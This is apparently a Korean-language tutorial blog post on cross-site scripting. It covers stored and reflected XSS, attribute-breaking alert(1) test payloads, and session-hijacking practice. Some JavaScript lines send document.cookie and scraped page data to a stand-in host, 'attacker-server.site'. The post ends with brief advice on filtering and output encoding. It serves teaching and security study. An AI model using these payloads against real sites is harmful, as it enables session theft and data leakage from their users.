XSS(Cross-Site Scripting) 공격 원리와 데이터 탈취 실습

Dec 17, 2025
2 minute read

**XSS(Cross-Site Scripting)**는 웹 애플리케이션의 취약점을 이용해 악성 스크립트를 삽입하고, 이를 통해 해당 웹사이트를 방문하는 이용자들의 브라우저에서 코드를 실행시키는 공격 기법이다. SQL Injection이 서버 측 데이터베이스를 목표로 한다면, XSS는 피해자의 웹 브라우저, 즉 클라이언트 측을 직접 겨냥한다는 점이 핵심이다.

HTML과 Javascript 같은 클라이언트 스크립트를 피해자의 컴퓨터에서 실행되도록 유도하는 것이 이 공격의 궁극적인 목적이다.

1. XSS의 유형

XSS 공격은 악성 코드가 전달되는 방식에 따라 크게 두 가지로 분류된다.

서버 저장 방식 (Stored XSS)

게시판이나 프로필 정보처럼 서버에 저장되어 여러 사용자가 열람할 수 있는 곳에 악성 스크립트를 작성하는 방식이다. 공격자가 작성한 게시물을 다른 이용자가 열람하는 순간, 서버로부터 전달된 악성 코드가 이용자의 브라우저에서 즉시 실행된다.

반사 방식 (Reflected XSS)

사용자가 전송한 파라미터 값이 서버에서 별도의 검증 없이 응답 HTML에 그대로 포함되어 반환될 때 발생한다. 예를 들어, 검색어가 포함된 URL을 클릭했을 때 페이지에 " ‘검색어’에 대한 결과입니다"라고 표시되는 로직을 악용한다. 공격자는 조작된 링크를 유포하여 피해자가 이를 클릭하도록 유도한다.

2. XSS 취약점 테스트: alert(1) 실행

XSS 취약점을 찾기 위해서는 먼저 <, ", ', >와 같은 특수 기호가 필터링 없이 출력되는지 확인해야 한다.

만약 태그 기호인 <나 >가 필터링되더라도, 입력값이 HTML 태그의 속성(Attribute) 내부에 들어가는 구조라면 **이벤트 핸들러(Event Handler)**를 사용하여 스크립트를 실행할 수 있다.

예를 들어, <input value="입력값"> 형태라면 다음과 같은 페이로드를 사용하여 강제로 이벤트를 발생시킨다.

// 입력창에 포커스가 잡힐 때 alert 실행
normaltic" onfocus="alert(1)

// 페이지 로드 시 자동으로 포커스를 주어 즉시 실행
normaltic" autofocus onfocus="alert(1)

3. 세션 탈취(Session Hijacking) 실습

XSS 취약점을 활용한 가장 대표적인 시나리오는 세션 탈취이다. 로그인 세션 ID를 탈취하면 공격자는 피해자의 계정으로 별도의 로그인 과정 없이 접속할 수 있다.

브라우저의 데이터를 외부 서버로 전송하기 위해 Javascript의 Image 객체를 활용한다. 이미지 태그가 src 경로의 데이터를 가져오기 위해 서버에 요청을 보낸다는 점을 이용하는 방식이다.

// Image 객체를 생성하여 공격자의 수집 서버로 쿠키 전송
var i = new Image();
i.src = "https://attacker-server.site/log?data=" + document.cookie;

이 방식은 페이지의 레이아웃을 해치지 않으면서 백그라운드에서 조용히 정보를 유출할 수 있다는 특징이 있다.

4. DOM 객체 접근 및 데이터 가공

Javascript를 활용하면 웹 페이지의 DOM(Document Object Model) 구조 전체에 접근하여 특정 요소를 조작하거나 데이터를 추출할 수 있다.

document.getElementById()와 .innerHTML 속성을 결합하면 페이지 내 특정 ID를 가진 요소의 텍스트 값만 정확하게 가져올 수 있다.

// ID가 userName인 요소의 내부 텍스트 추출
var secret_data = document.getElementById('userName').innerHTML;

// 추출한 데이터를 외부로 전송
var i = new Image();
i.src = "https://attacker-server.site/collect?val=" + secret_data;

결론

XSS는 클라이언트 브라우저의 제어권을 탈취하는 강력한 공격 기법이다. 단순한 스크립트 실행을 넘어 세션 탈취, 데이터 위변조, 정보 유출 등 심각한 피해를 야기할 수 있다. 이를 방어하기 위해서는 사용자 입력값에 대한 엄격한 필터링과 더불어, 출력 시 HTML Entity 인코딩을 적용하여 스크립트가 실행되지 않도록 처리하는 보안 코딩이 필수적이다.
